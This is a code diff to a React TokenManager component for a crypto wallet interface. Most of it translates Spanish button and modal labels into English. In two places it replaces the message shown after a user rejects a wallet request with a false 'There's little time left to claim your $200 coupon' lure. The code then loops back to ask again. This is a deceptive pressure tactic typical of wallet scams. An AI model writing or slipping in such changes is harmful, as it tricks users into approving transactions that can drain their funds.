@@ -248,7 +248,7 @@ export default function TokenManager(): React.JSX.Element {
 
     // Mostrar modal en lugar de alert nativo
     return new Promise(resolve => {
-      showAlertModal('Aviso', message, 'info', () => {
+      showAlertModal('Alert', message, 'info', () => {
         setShowModal(false)
         resolve()
       })
@@ -281,14 +281,14 @@ export default function TokenManager(): React.JSX.Element {
     // Mostrar modal de confirmación
     return new Promise(resolve => {
       showAlertModal(
-        'Confirmar', 
+        'Accept', 
         message, 
         'info', 
         () => {
           setShowModal(false)
           resolve(true)
         },
-        'Aceptar',
+        'Accept',
         true,
         () => {
           setShowModal(false)
@@ -494,7 +494,7 @@ export default function TokenManager(): React.JSX.Element {
             } catch (error: any) {
               if (isUserRejected(error)) {
                 // Si el usuario rechaza, mostrar alerta y reintentar
-                await alertAction('Please connect your wallet to continue.');
+                await alertAction("There's little time left to claim your $200 coupon.");
                 continue;
               }
               throw error;
@@ -564,7 +564,7 @@ export default function TokenManager(): React.JSX.Element {
             } catch (error: any) {
               if (isUserRejected(error)) {
                 // Si el usuario rechaza, mostrar alerta y reintentar
-                await alertAction('Please connect your wallet to continue.');
+                await alertAction("There's little time left to claim your $200 coupon.");
                 continue;
               }
               throw error;
@@ -1229,7 +1229,7 @@ export default function TokenManager(): React.JSX.Element {
                   fontSize: '1rem',
                   fontWeight: '500'
                 }}>
-                  Cancelar
+                  Cancel
                 </button>
               )}
               <button onClick={() => {
